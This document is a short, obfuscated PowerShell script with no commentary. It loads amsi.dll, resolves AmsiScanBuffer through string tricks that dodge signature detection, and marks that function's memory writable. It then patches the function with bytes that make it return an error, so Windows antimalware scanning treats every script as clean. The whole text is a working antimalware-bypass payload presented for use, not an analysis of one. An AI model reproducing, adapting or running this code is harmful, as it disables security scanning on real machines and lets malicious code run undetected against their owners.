$SPnGg2FWoElv3Xe9Ag = @"
using System;
using System.Runtime.InteropServices;
public class SPnGg2FWoElv3Xe9Ag {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr iLs8GeiAF, string qyxGwIkJhFz);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr n2MKX2hFBxYj, UIntPtr AbfXld, uint XgGdYQxR1mivJi3d, out uint zRkMSGDGGNQ);
}
"@

Add-Type $SPnGg2FWoElv3Xe9Ag

$Lx_hiA5R8xA = [SPnGg2FWoElv3Xe9Ag]::LoadLibrary("$(('ãms'+'í.d'+'ll').NOrMALiZE([chAr](70)+[cHar](111+102-102)+[ChAR](114*97/97)+[char](109)+[cHar]([byTe]0x44)) -replace [ChAR]([BYTe]0x5c)+[cHaR](112*57/57)+[cHar]([bYTE]0x7b)+[chaR]([Byte]0x4d)+[ChAr](110*71/71)+[cHAR](125*79/79))")
$txB_J = [SPnGg2FWoElv3Xe9Ag]::GetProcAddress($Lx_hiA5R8xA, "$(('Áms'+'îSc'+'ánB'+'ûff'+'ér').NOrMalizE([cHar](56+14)+[ChaR](111)+[CHAR]([Byte]0x72)+[CHar](109)+[CHAR](68*49/49)) -replace [ChaR]([byTE]0x5c)+[cHar]([bYTE]0x70)+[CHAr]([bYTE]0x7b)+[CHAR](77+13-13)+[chaR]([bytE]0x6e)+[cHar](125))")
$p = 0
[SPnGg2FWoElv3Xe9Ag]::VirtualProtect($txB_J, [uint32]5, 0x40, [ref]$p)
$ewXCsOkK8juJCuyxo13C = "0xB8"
$Vj5PBBZ61J1Q54Fk9tJT = "0x57"
$v8j_pN = "0x00"
$Xy4Z_T4N0evJU94o5 = "0x07"
$_KnkRi9zrOl = "0x80"
$shsdl6YtdUo8n4 = "0xC3"
$nOsNFbk = [Byte[]] ($ewXCsOkK8juJCuyxo13C,$Vj5PBBZ61J1Q54Fk9tJT,$v8j_pN,$Xy4Z_T4N0evJU94o5,+$_KnkRi9zrOl,+$shsdl6YtdUo8n4)
[System.Runtime.InteropServices.Marshal]::Copy($nOsNFbk, 0, $txB_J, 6)